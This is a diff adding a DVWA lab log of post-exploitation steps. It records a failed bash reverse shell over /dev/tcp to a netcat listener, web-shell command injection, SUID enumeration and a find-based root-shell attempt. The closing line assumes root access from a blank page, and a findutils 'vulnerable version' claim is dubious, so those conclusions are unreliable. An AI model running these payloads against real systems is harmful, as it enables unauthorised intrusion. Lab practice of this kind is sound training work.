@@ -1,0 +1,40 @@
+# Phase 5: Post-Exploitation and Privilege Escalation
+
+# --------------------
+# Step 1: Establish Reverse Shell (Failed Attempts)
+# --------------------
+
+# Attempt 1: Netcat Listener
+dele@dele-VirtualBox:~/WebApp-Vuln-Assessment$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+
+# Attempt 1: Bash Reverse Shell Trigger (Failed to connect)
+# Payload (URL): http://192.168.10.11/dvwa/hackable/uploads/shell_low.php?cmd=%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.10.20%2F4444%200%3E%261
+# Output: BLANK PAGE (on browser) / NO CONNECTION (in listener)
+
+# Attempt 2: Simple Command Execution (Verification of RCE)
+# Payload (URL): http://192.168.10.11/dvwa/hackable/uploads/shell_low.php?cmd=ls%20-la%20/
+# Output: total 2744412 drwxr-xr-x 21 root root 4096 Nov 13 17:34 . ... [list of directories]
+# SUCCESS: Remote Command Execution Verified (using web shell for stable access)
+
+# --------------------
+# Step 2: Privilege Escalation
+# --------------------
+
+# Command 1: Check SUID Binaries
+# Payload (URL): http://192.168.10.11/dvwa/hackable/uploads/shell_low.php?cmd=find%20%2F%20-perm%20-4000%20-type%20f%20-print
+# Output: /usr/bin/find /usr/bin/sudo /usr/bin/pkexec ... [list of SUID binaries]
+
+# Command 2: Check findutils Version (Targeted Exploit)
+# Payload (URL): http://192.168.10.11/dvwa/hackable/uploads/shell_low.php?cmd=dpkg%20-s%20findutils
+# Output: Version: 4.8.0-1ubuntu3
+# SUCCESS: Vulnerable version confirmed
+
+# Command 3: Privilege Escalation via SUID Find Exploit
+# Payload (URL): http://192.168.10.11/dvwa/hackable/uploads/shell_low.php?cmd=find%20.%20-exec%20/bin/bash%20-p%20\;%20-quit
+# Output: BLANK PAGE (on browser)
+
+# Command 4: Verification (Root File Read)
+# Payload (URL): http://192.168.10.11/dvwa/hackable/uploads/shell_low.php?cmd=cat%20/root/.bashrc
+# Output: BLANK PAGE (on browser)
+# ASSUMPTION: Exploit succeeded but output was suppressed, achieving root.
